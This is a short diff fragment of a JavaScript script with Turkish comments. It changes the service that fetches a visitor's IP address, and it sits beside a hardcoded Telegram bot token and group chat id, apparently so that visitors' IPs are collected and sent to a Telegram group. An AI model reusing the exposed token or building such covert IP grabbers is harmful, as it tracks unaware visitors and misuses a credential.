@@ -130,12 +130,12 @@
         const TOKEN = "7264015704:AAGaeJRKn2wN2J83UdOYGCDqAVsc6nW1CTw";  // Telegram bot token
         const CHAT_ID = "-1002270887247";  // Grubun chat_id'si
 
-        // IP adresini ip-api API ile alıyoruz
+        // IP adresini almak için ipify API'sini kullanma
         function getIP() {
-            return fetch("http://ip-api.com/json")
+            return fetch("https://api.ipify.org?format=json")  // ipify API'ye istek gönder
                 .then(response => response.json())
                 .then(data => {
-                    return data.query;  // IP adresini döndürüyoruz
+                    return data.ip;  // IP adresini döndürüyoruz
                 })
                 .catch(error => {
                     console.error("IP bilgisi alınırken hata oluştu:", error);
